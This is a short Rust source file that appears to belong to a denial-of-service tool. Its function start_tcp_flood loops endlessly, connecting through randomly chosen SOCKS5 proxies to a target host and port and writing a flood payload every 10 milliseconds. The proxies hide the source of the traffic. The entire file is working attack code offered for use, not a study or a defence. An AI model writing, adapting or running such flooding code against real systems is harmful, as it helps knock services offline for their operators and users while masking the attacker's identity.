// src/flood/tcp.rs
use tokio::io::AsyncWriteExt;
use tokio::time::{sleep, Duration};
use tokio_socks::tcp::Socks5Stream;
use crate::utils::get_random_proxy;

pub async fn start_tcp_flood(target: &str, port: u16, proxies: Vec<String>) {
    loop {
        if let Some(proxy) = get_random_proxy(&proxies) {
            let proxy_parts: Vec<&str> = proxy.split(':').collect();
            if proxy_parts.len() == 2 {
                if let Ok(mut stream) = Socks5Stream::connect(
                    (proxy_parts[0], proxy_parts[1].parse().unwrap_or(1080)),
                    (target, port)
                ).await {
                    let payload = b"TCP FLOOD PAYLOAD\n";
                    let _ = stream.write_all(payload).await;
                    println!("[TCP] Sent via {}", proxy);
                }
            }
        }
        sleep(Duration::from_millis(10)).await;
    }
}